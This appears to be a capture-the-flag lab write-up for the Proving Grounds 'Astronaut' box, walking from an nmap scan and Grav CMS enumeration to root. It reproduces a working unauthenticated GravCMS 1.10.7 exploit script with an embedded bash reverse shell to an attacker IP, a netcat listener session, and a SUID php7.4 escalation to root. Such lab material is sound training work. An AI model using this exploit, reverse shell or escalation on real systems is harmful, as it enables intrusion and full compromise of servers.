---
layout: default
title: Astronaut
parent: Proving Grounds Practice - Linux
nav_order: 8
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.184.12
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-27 21:59 EST
Nmap scan report for 192.168.184.12
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.03 seconds

```

# Enumeration

---

## HTTP | 80

![folder](../../../assets/images/ctfs/proving_grounds/astronaut/folder.png)

This leads to the directory _/grav-admin_ and run Gobuster here.

_robots.txt_

```bash
Disallow: /backup/ # forbidden
Disallow: /bin/ # forbidden
Disallow: /cache/ # forbidden
Disallow: /grav/ #interesting
Disallow: /logs/ # forbidden
Disallow: /system/ # forbidden
Disallow: /vendor/ # forbidden
Disallow: /user/ # forbidden
Allow: /user/pages/ # forbidden
Allow: /user/themes/ # forbidden
Allow: /user/images/ # interesting
Allow: /
Allow: *.css$
Allow: *.js$
Allow: /system/*.js$
```

_/grav-admin/admin_ returns a login page

![admin](../../../assets/images/ctfs/proving_grounds/astronaut/admin.png)

# Exploitation

---

Searchsploit shows a Grav CMS exploit.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/astronaut]
└─$ searchsploit grav
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------

GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)    | php/webapps/49973.py
```

Checking the exploit there is Base64 Encoded value we need to replace with a reverse shell one-liner to our attack machine.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/astronaut]
└─$ cat 49973.py
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.184.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxNy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)

```

Once the exploit executes we should be able to trigger the PHP reverse shell at the endpoint _/tmp/rev.sh_

![rev](../../../assets/images/ctfs/proving_grounds/astronaut/rev.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.184.12] 59570
bash: cannot set terminal process group (69285): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gravity:~/html/grav-admin$

```

# Post-Exploitation

---

## Check SUID Permissions

Checking SUID bit for interesting files we see _/usr/bin/php7.4_ and should be able to get a root shell by exploiting this.

![gtfo](../../../assets/images/ctfs/proving_grounds/astronaut/gtfo.png)

```bash
www-data@gravity:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
www-data@gravity:/dev/shm$ CMD="/bin/bash"
CMD="/bin/bash"
www-data@gravity:/dev/shm$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
</usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
root

```
